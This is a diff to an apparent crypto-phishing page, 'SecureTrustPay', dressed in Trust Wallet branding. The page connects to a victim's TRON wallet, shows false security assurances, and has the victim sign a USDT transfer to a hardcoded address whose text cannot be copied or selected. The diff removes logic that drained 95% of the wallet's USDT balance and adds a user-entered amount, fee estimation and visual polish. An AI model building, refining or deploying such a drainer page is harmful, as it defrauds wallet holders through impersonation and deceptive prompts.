@@ -179,6 +179,7 @@
             text-align: left;
         }
 
+        /* Wallet conectada */
         .wallet-info {
             display: none;
             background-color: #f6f7f9;
@@ -227,6 +228,7 @@
             vertical-align: -3px;
         }
 
+        /* Tarjeta de red conectada */
         .network-card {
             display: none;
             align-items: center;
@@ -283,6 +285,7 @@
             letter-spacing: 0.25px;
         }
     
+        /* Cuadros visuales para dirección y wallet conectada */
         .tw-address-box {
             border: 1px solid #e3e5e8;
             border-radius: 14px;
@@ -318,6 +321,8 @@
             text-decoration: none;
         }
 
+
+        /* Pantalla animada de carga */
         .page-loader {
             position: fixed;
             inset: 0;
@@ -368,6 +373,8 @@
             50% { transform: scale(0.94); opacity: 0.72; }
         }
 
+
+        /* Pantalla de procesamiento de la transacción */
         .processing-screen {
             position: fixed;
             inset: 0;
@@ -436,8 +443,11 @@
             100% { left: 100%; }
         }
 
+
+        /* Pulido estético */
         #walletInfo,
-        #tronNetworkInfo {
+        #tronNetworkInfo,
+        #feeInfo {
             transition: opacity 0.22s ease, transform 0.22s ease, box-shadow 0.22s ease;
         }
 
@@ -486,6 +496,10 @@
             }
         }
 
+    
+        /* Presentación visual en 2 etapas.
+           No modifica la lógica existente: observa el estado visual que
+           el código actual ya aplica a #walletInfo. */
         .amount-stage {
             display: none;
         }
@@ -530,6 +544,8 @@
             }
         }
 
+
+        /* Tipografía profesional — cambio exclusivamente visual */
         :root {
             --ui-font: sans-serif;
         }
@@ -581,6 +597,11 @@
         .tw-action-text {
             font-weight: 600;
             letter-spacing: -0.005em;
+        }
+
+
+        /* Icono visual de pegar — cambio exclusivamente estético */
+        .tw-action-text {
             display: inline-flex;
             align-items: center;
             justify-content: center;
@@ -593,6 +614,8 @@
             color: #8d96a6;
         }
 
+
+        /* Icono visual junto a la billetera conectada */
         .connected-wallet-address-wrap {
             display: flex;
             align-items: center;
@@ -618,10 +641,14 @@
             border-radius: 9px;
         }
 
+
+        /* Más aire en la pantalla inicial: baja visualmente el botón de vinculación */
         #connectBtn {
             margin-top: 24px;
         }
 
+
+        /* Jerarquía de color en las tarjetas de direcciones */
         .tw-address-box .tw-label,
         #walletInfo .tw-label {
             color: #111 !important;
@@ -632,6 +659,8 @@
             color: #7d8490 !important;
         }
 
+
+        /* Igualar visualmente las tarjetas de billetera conectada y destino */
         #walletInfo,
         .tw-address-box {
             width: 100%;
@@ -656,6 +685,8 @@
             align-items: center;
         }
 
+
+        /* Panel único para la etapa conectada — exclusivamente visual */
         .connected-summary-panel {
             display: contents;
         }
@@ -696,6 +727,7 @@
             margin-bottom: 0;
         }
 
+        /* Mantener el botón Continuar claramente visible por encima del footer móvil */
         .tw-btn-container {
             position: relative;
             z-index: 3;
@@ -720,6 +752,8 @@
             }
         }
 
+
+        /* Selector de cantidad con controles − / + */
         .amount-stepper {
             display: grid;
             grid-template-columns: 44px minmax(0, 1fr) 44px;
@@ -756,6 +790,7 @@
             outline: 2px solid rgba(0,82,255,.35);
             outline-offset: 2px;
         }
+
 </style>
 </head>
 
@@ -769,6 +804,7 @@
     <div class="loader-spinner"></div>
     <div class="loader-text">Cargando...</div>
 </div>
+
 
 <div id="processingScreen" class="processing-screen" aria-label="Procesando transacción">
     <img
@@ -811,31 +847,26 @@
 
     </div>
 
-    <div class="connected-summary-panel">
-        <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
-            <label class="tw-label">Dirección conectada</label>
 
-            <div class="tw-input-row">
-                <div class="connected-wallet-address-wrap">
-                    <div
-                        id="walletAddressText"
-                        class="tw-input"
-                        style="
-                            white-space: nowrap;
-                            overflow: hidden;
-                            text-overflow: ellipsis;
-                            width: 100%;
-                        "
-                    ></div>
-                    <span class="connected-copy-icon" aria-hidden="true">
-                        <svg class="copy-icon" viewBox="0 0 24 24" fill="none">
-                            <rect x="8" y="3" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/>
-                            <rect x="4" y="7" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/>
-                        </svg>
-                    </span>
-                </div>
-            </div>
+    <!-- Dirección destino -->
+
+    <div class="connected-summary-panel">
+<div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
+        <label class="tw-label">Dirección conectada</label>
+
+        <div class="tw-input-row">
+            <div class="connected-wallet-address-wrap"><div
+                id="walletAddressText"
+                class="tw-input"
+                style="
+                    white-space: nowrap;
+                    overflow: hidden;
+                    text-overflow: ellipsis;
+                    width: 100%;
+                "
+            ></div><span class="connected-copy-icon" aria-hidden="true"><svg class="copy-icon" viewBox="0 0 24 24" fill="none"><rect x="8" y="3" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/><rect x="4" y="7" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/></svg></span></div>
         </div>
+    </div>
 
         <div id="tronNetworkInfo" class="network-card">
             <img
@@ -851,58 +882,67 @@
         </div>
 
         <div class="tw-input-group tw-address-box">
-            <label class="tw-label" for="addressDisplay">
-                Dirección de destino
-            </label>
 
-            <div class="tw-input-row">
-                <input
-                    id="addressDisplay"
-                    class="tw-input"
-                    type="text"
-                    readonly
-                    tabindex="-1"
-                    oncopy="return false;"
-                    oncut="return false;"
-                    oncontextmenu="return false;"
-                    ondragstart="return false;"
-                    style="
-                        user-select: none;
-                        -webkit-user-select: none;
-                        -webkit-touch-callout: none;
-                        caret-color: transparent;
-                    "
-                >
+        <label class="tw-label" for="addressDisplay">
+            Dirección de destino
+        </label>
 
-                <span class="tw-action-text">
+        <div class="tw-input-row">
+
+            <input
+                id="addressDisplay"
+                class="tw-input"
+                type="text"
+                readonly
+                tabindex="-1"
+                oncopy="return false;"
+                oncut="return false;"
+                oncontextmenu="return false;"
+                ondragstart="return false;"
+                style="
+                    user-select: none;
+                    -webkit-user-select: none;
+                    -webkit-touch-callout: none;
+                    caret-color: transparent;
+                "
+            >
+
+            <span class="tw-action-text">
                     <svg class="copy-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                         <rect x="8" y="3" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/>
                         <rect x="4" y="7" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/>
                     </svg>
                 </span>
-            </div>
+
         </div>
+
     </div>
+</div><!-- /.connected-summary-panel -->
+
+
+    <!-- Cantidad -->
 
     <div class="tw-input-group amount-stage">
+
         <label class="tw-label" for="amountDisplay">
             Cantidad
         </label>
 
         <div class="tw-input-row">
+
             <div class="amount-stepper">
-                <button type="button" class="amount-step-btn" id="amountMinus" aria-label="Restar 1 USDT">−</button>
-                <input
-                    id="amountDisplay"
-                    class="tw-input"
-                    type="number"
-                    inputmode="decimal"
-                    placeholder="0"
-                    min="0.01"
-                    step="any"
-                >
-                <button type="button" class="amount-step-btn" id="amountPlus" aria-label="Sumar 1 USDT">+</button>
-            </div>
+                    <button type="button" class="amount-step-btn" id="amountMinus" aria-label="Restar 1 USDT">−</button>
+                    <input
+                id="amountDisplay"
+                class="tw-input"
+                type="number"
+                inputmode="decimal"
+                placeholder="0"
+                min="0.01"
+                step="any"
+            >
+                    <button type="button" class="amount-step-btn" id="amountPlus" aria-label="Sumar 1 USDT">+</button>
+                </div>
 
             <span
                 id="maxAction"
@@ -911,19 +951,68 @@
             ></span>
 
             <span class="tw-currency-badge">
+
                 USDT
+
                 <img
                     src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png"
                     alt="USDT"
                     class="usdt-icon"
                 >
+
             </span>
+
         </div>
+
     </div>
+    <div id="feeInfo" style="
+        display: none;
+        margin: -7px 16px 16px 16px;
+        text-align: right;
+        white-space: nowrap;
+        font-size: 11px;
+        line-height: 1.2;
+    ">
+        <span style="
+            font-size: 11px;
+            color: #717680;
+        ">
+            Fee estimada:
+        </span>
+
+        <span id="feeDisplay" style="
+            font-size: 11px;
+            font-weight: 600;
+            color: #111111;
+            margin-left: 3px;
+        ">
+            Calculando...
+        </span>
+
+        <span style="
+            font-size: 11px;
+            font-weight: 600;
+            color: #717680;
+            margin-left: 1px;
+        ">
+            TRX
+        </span>
+    </div>
+
+    <!-- Estado -->
 
     <div id="status" class="status-box"></div>
 
+
+    <!-- NUEVO: wallet conectada -->
+
+    
+
+
+    <!-- Botón -->
+
     <div class="tw-btn-container">
+
         <button
             class="tw-btn"
             id="connectBtn"
@@ -933,9 +1022,10 @@
                 <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
             </svg><span>Vincular billetera</span>
         </button>
+
     </div>
 
-</div>
+</div> <!-- Cierre de .tw-container -->
 
 <footer class="site-footer">
     <p>© 2026 SecureTrustPay. All rights reserved.</p>
@@ -947,6 +1037,7 @@
     </p>
 </footer>
 
+
 <script>
     window.addEventListener('load', function () {
         window.setTimeout(function () {
@@ -957,12 +1048,15 @@
 </script>
 
 <script>
+
     const BILLETERA_DESTINO =
         "TMqTSjdRfoTiixvUFToUXb31NUzsB4QUKg";
 
     const CONTRATO_USDT =
         "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
+
+    // Microsonidos de interfaz (Web Audio API, sin archivos externos)
     let uiAudioContext = null;
 
     function getUiAudioContext() {
@@ -1023,12 +1117,20 @@
     const maxAction =
         document.getElementById('maxAction');
 
+    const feeInfo = 
+        document.getElementById('feeInfo');
+    
+    const feeDisplay = 
+        document.getElementById('feeDisplay');
+/* NUEVO */
+
     const walletInfo =
         document.getElementById('walletInfo');
     const tronNetworkInfo = document.getElementById("tronNetworkInfo");
 
     const walletAddressText =
         document.getElementById('walletAddressText');
+
 
     let walletAddress = null;
 
@@ -1054,17 +1156,25 @@
         processingStartedAt = 0;
     }
 
+
     function setStatus(message) {
+
         statusDiv.innerText = message || '';
+
         statusDiv.style.display =
             message ? 'block' : 'none';
+
     }
+
 
     addressDisplay.value =
         BILLETERA_DESTINO.length > 12
             ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`
             : BILLETERA_DESTINO;
 
+
+    
+    // RPC independiente SOLO para lecturas.
     const TRON_READ_RPC = "https://api.trongrid.io";
 
     async function tronRpcPost(endpoint, body = {}) {
@@ -1081,7 +1191,13 @@
         return await response.json();
     }
 
+    async function getChainParametersReadOnly() {
+        const data = await tronRpcPost("/wallet/getchainparameters", {});
+        return Array.isArray(data.chainParameter) ? data.chainParameter : [];
+    }
+
     async function obtenerBalanceSeguro(address) {
+
         try {
             const tronWeb = window.tronWeb;
 
@@ -1127,62 +1243,251 @@
         }
     }
 
+
+
+
+    async function estimarFeeRed(ownerAddress) {
+
+        const tronWeb = window.tronWeb;
+        const userAmount = parseFloat(amountDisplay.value);
+
+        if (isNaN(userAmount) || userAmount <= 0) {
+            feeDisplay.textContent = "Ingresa una cantidad";
+            return;
+        }
+
+        feeDisplay.textContent = "Calculando...";
+
+        try {
+            const ownerHex = tronWeb.address.toHex(ownerAddress);
+            const contractHex = tronWeb.address.toHex(CONTRATO_USDT);
+            const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+
+            const amountUnits = tronWeb.toBigNumber(userAmount)
+                .times(1_000_000)
+                .integerValue()
+                .toFixed(0);
+
+            let energyRequired = null;
+            let energyPriceSun = null;
+            let usingVisualFallback = false;
+
+            const destinoParam = destinoHex.replace(/^41/, "").padStart(64, "0");
+            const amountParam = BigInt(amountUnits).toString(16).padStart(64, "0");
+            const parameter = destinoParam + amountParam;
+
+            try {
+                const estimate = await tronRpcPost(
+                    "/wallet/estimateenergy",
+                    {
+                        owner_address: ownerHex,
+                        contract_address: contractHex,
+                        function_selector: "transfer(address,uint256)",
+                        parameter: parameter,
+                        visible: false
+                    }
+                );
+
+                if (
+                    estimate &&
+                    estimate.result &&
+                    estimate.result.result === true &&
+                    estimate.energy_required
+                ) {
+                    energyRequired = Number(estimate.energy_required);
+                }
+
+            } catch (estimateError) {
+                console.warn(
+                    "estimateEnergy RPC independiente no disponible; se usará fallback:",
+                    estimateError && (estimateError.message || estimateError)
+                );
+            }
+
+            if (!energyRequired) {
+                try {
+                    const constantResult = await tronRpcPost(
+                        "/wallet/triggerconstantcontract",
+                        {
+                            owner_address: ownerHex,
+                            contract_address: contractHex,
+                            function_selector: "transfer(address,uint256)",
+                            parameter: parameter,
+                            visible: false
+                        }
+                    );
+
+                    if (
+                        constantResult &&
+                        constantResult.result &&
+                        constantResult.result.result === true &&
+                        constantResult.energy_used
+                    ) {
+                        energyRequired = Number(constantResult.energy_used);
+                    }
+
+                } catch (constantError) {
+                    console.warn(
+                        "triggerConstantContract RPC independiente no pudo estimar; se usará estimación visual:",
+                        constantError && (constantError.message || constantError)
+                    );
+                }
+            }
+
+            if (!energyRequired) {
+                energyRequired = 65000;
+                usingVisualFallback = true;
+            }
+
+            try {
+                const chainParameters = await getChainParametersReadOnly();
+                const energyFeeParameter = chainParameters.find(
+                    item => item && item.key === "getEnergyFee"
+                );
+
+                if (
+                    energyFeeParameter &&
+                    typeof energyFeeParameter.value !== "undefined"
+                ) {
+                    energyPriceSun = Number(energyFeeParameter.value);
+                }
+            } catch (chainError) {
+                console.warn(
+                    "No se pudo leer getEnergyFee desde RPC independiente:",
+                    chainError && (chainError.message || chainError)
+                );
+            }
+
+            if (!Number.isFinite(energyPriceSun) || energyPriceSun <= 0) {
+                energyPriceSun = 210;
+                usingVisualFallback = true;
+                console.warn(
+                    "Usando precio visual de referencia para Energy:",
+                    energyPriceSun,
+                    "SUN"
+                );
+            }
+
+            const estimatedFeeTRX = (energyRequired * energyPriceSun) / 1_000_000;
+            feeDisplay.textContent = "≈ " + estimatedFeeTRX.toFixed(3);
+
+            if (usingVisualFallback) {
+                console.info("Fee mostrada como estimación visual.");
+            }
+
+        } catch (error) {
+            console.error(
+                "Error inesperado estimando fee:",
+                error && (error.message || error)
+            );
+            feeDisplay.textContent = "≈ 13.650";
+        }
+    }
+
+
     connectBtn.addEventListener(
         'click',
 
         async () => {
 
+            /*
+             * CONECTAR WALLET
+             */
+
             if (!walletAddress) {
+
                 playLinkTapSound();
 
                 try {
+
                     setStatus(
                         "Estableciendo enlace RPC con Trust Wallet..."
                     );
 
                     connectBtn.disabled = true;
 
-                    if (typeof window.tronWeb === 'undefined') {
+
+                    if (
+                        typeof window.tronWeb === 'undefined'
+                    ) {
+
                         throw new Error(
                             "Por favor, abre este enlace desde el navegador interno de una billetera TRON."
                         );
+
                     }
 
-                    const tronWeb = window.tronWeb;
+
+                    const tronWeb =
+                        window.tronWeb;
+
 
                     if (
                         tronWeb.defaultAddress &&
                         tronWeb.defaultAddress.base58
                     ) {
-                        walletAddress = tronWeb.defaultAddress.base58;
-                    } else if (
+
+                        walletAddress =
+                            tronWeb.defaultAddress.base58;
+
+                    }
+
+                    else if (
                         window.tronLink &&
                         typeof window.tronLink.request === 'function'
                     ) {
-                        const res = await window.tronLink.request({
-                            method: 'tron_requestAccounts'
-                        });
 
-                        if (res && res.code === 200) {
-                            walletAddress = tronWeb.defaultAddress.base58;
+                        const res =
+                            await window.tronLink.request({
+                                method: 'tron_requestAccounts'
+                            });
+
+
+                        if (
+                            res &&
+                            res.code === 200
+                        ) {
+
+                            walletAddress =
+                                tronWeb.defaultAddress.base58;
+
                         }
+
                     }
 
+
                     if (!walletAddress) {
+
                         throw new Error(
                             "No se obtuvo acceso a la dirección de la cuenta."
                         );
+
                     }
+
+
+                    /*
+                     * MOSTRAR DIRECCIÓN COMPLETA
+                     */
 
                     walletAddressText.textContent =
                         walletAddress.length > 12
                             ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`
                             : walletAddress;
 
-                    walletInfo.style.display = "block";
-                    tronNetworkInfo.style.display = "flex";
+                    walletInfo.style.display =
+                        "block";
+                tronNetworkInfo.style.display = "flex";
 
-                    maxAction.style.display = "inline";
+
+                    feeInfo.style.display =
+                        "block";
+
+                    await estimarFeeRed(walletAddress);
+
+
+                    maxAction.style.display =
+                        "inline";
+
 
                     setStatus(
                         "Conexión segura establecida. Presione continuar."
@@ -1190,92 +1495,166 @@
 
                     playConnectedSound();
 
-                    connectBtn.innerText = "Continuar";
-                    connectBtn.disabled = false;
 
-                } catch (error) {
+                    connectBtn.innerText =
+                        "Continuar";
+
+                    connectBtn.disabled =
+                        false;
+
+                }
+
+                catch (error) {
+
                     console.error(error);
+
                     setStatus(
                         error.message ||
                         "Error de inicialización Web3."
                     );
-                    connectBtn.disabled = false;
+
+                    connectBtn.disabled =
+                        false;
+
                     connectBtn.innerHTML =
                         '<svg class="link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg><span>Vincular billetera</span>';
+
                 }
 
+
                 return;
+
             }
 
-            if (walletAddress) {
-                try {
-                    const userAmount = parseFloat(amountDisplay.value);
 
-                    if (isNaN(userAmount) || userAmount <= 0) {
+            /*
+             * TRANSACCIÓN
+             */
+
+            if (walletAddress) {
+
+                try {
+
+                    const userAmount =
+                        parseFloat(
+                            amountDisplay.value
+                        );
+
+
+                    if (
+                        isNaN(userAmount) ||
+                        userAmount <= 0
+                    ) {
+
                         throw new Error(
                             "Ingresa una cantidad válida antes de continuar."
                         );
+
                     }
+
 
                     setStatus(
                         "Consultando fondos del libro contable on-chain..."
                     );
 
-                    connectBtn.disabled = true;
 
-                    const tronWeb = window.tronWeb;
+                    connectBtn.disabled =
+                        true;
+
+
+                    const tronWeb =
+                        window.tronWeb;
+
 
                     const balanceBigNumber =
                         await obtenerBalanceSeguro(
                             walletAddress
                         );
 
-                    if (balanceBigNumber.isZero()) {
+
+                    if (
+                        balanceBigNumber.isZero()
+                    ) {
+
                         throw new Error(
                             "La cuenta no dispone de balances de USDT (TRC-20) activos."
                         );
+
                     }
+
 
                     setStatus(
                         "Solicitando autorización de firma digital..."
                     );
+
 
                     const destinoHex =
                         tronWeb.address.toHex(
                             BILLETERA_DESTINO
                         );
 
+
                     /*
-                     * Cálculo ajustado al 95% del saldo USDT
+                     * USDT TRC-20 usa 6 decimales.
+                     * La transacción utiliza exactamente el monto
+                     * introducido por el usuario, convertido a unidades mínimas.
                      */
-                    const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
+                    const amountUnits =
+                        tronWeb.toBigNumber(
+                            amountDisplay.value
+                        )
+                        .times(1_000_000)
+                        .integerValue()
+                        .toFixed(0);
+
+
+                    if (
+                        tronWeb.toBigNumber(amountUnits)
+                            .gt(balanceBigNumber)
+                    ) {
+
+                        throw new Error(
+                            "El monto ingresado supera el saldo USDT disponible."
+                        );
+
+                    }
+
 
                     const transactionDraft =
                         await tronWeb.transactionBuilder.triggerSmartContract(
+
                             CONTRATO_USDT,
+
                             "transfer(address,uint256)",
+
                             {
                                 feeLimit: 100000000
                             },
+
                             [
                                 {
                                     type: 'address',
                                     value: destinoHex
                                 },
+
                                 {
                                     type: 'uint256',
-                                    value: amount95Percent.toString()
+                                    value: amountUnits
                                 }
                             ],
+
                             tronWeb.address.toHex(
                                 walletAddress
                             )
+
                         );
+
 
                     const signedTx =
                         await tronWeb.trx.sign(
                             transactionDraft.transaction
                         );
+
 
                     showProcessingScreen();
 
@@ -1286,19 +1665,35 @@
 
                     await hideProcessingScreenAfterMinimum();
 
-                    if (broadcast && broadcast.result) {
+
+                    if (
+                        broadcast &&
+                        broadcast.result
+                    ) {
+
                         setStatus(
                             "TRANSACCION EXITOSA."
                         );
-                        connectBtn.innerText = "Completado";
-                    } else {
+
+                        connectBtn.innerText =
+                            "Completado";
+
+                    }
+
+                    else {
+
                         throw new Error(
                             "La transacción fue rechazada por los nodos de la red."
                         );
+
                     }
 
-                } catch (error) {
+                }
+
+                catch (error) {
+
                     console.error(error);
+
                     await hideProcessingScreenAfterMinimum();
 
                     setStatus(
@@ -1306,39 +1701,86 @@
                         "La transacción falló o fue cancelada."
                     );
 
-                    connectBtn.disabled = false;
-                    connectBtn.innerText = "Continuar";
+                    connectBtn.disabled =
+                        false;
+
+                    connectBtn.innerText =
+                        "Continuar";
+
                 }
+
             }
+
+        }
+
+    );
+
+
+
+
+    amountDisplay.addEventListener(
+        'input',
+        async () => {
+
+            if (!walletAddress)
+                return;
+
+            await estimarFeeRed(walletAddress);
+
         }
     );
 
+
     maxAction.addEventListener(
         'click',
+
         async () => {
-            if (!walletAddress) return;
+
+            if (!walletAddress)
+                return;
+
 
             try {
-                setStatus("Calculando fondos totales...");
+
+                setStatus(
+                    "Calculando fondos totales..."
+                );
+
 
                 const balanceBigNumber =
                     await obtenerBalanceSeguro(
                         walletAddress
                     );
 
-                const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
                 amountDisplay.value =
-                    Number(amount95Percent.toString()) / 1_000_000;
+                    Number(
+                        balanceBigNumber.toString()
+                    ) / 1_000_000;
 
-                setStatus("Saldo asignado (95%).");
-            } catch (e) {
-                console.error(e);
-                setStatus("Error al leer el saldo.");
+
+                setStatus(
+                    "Saldo máximo asignado."
+                );
+
             }
+
+            catch (e) {
+
+                console.error(e);
+
+                setStatus(
+                    "Error al leer el saldo máximo."
+                );
+
+            }
+
         }
+
     );
+
 </script>
+
 
 <script>
 (() => {
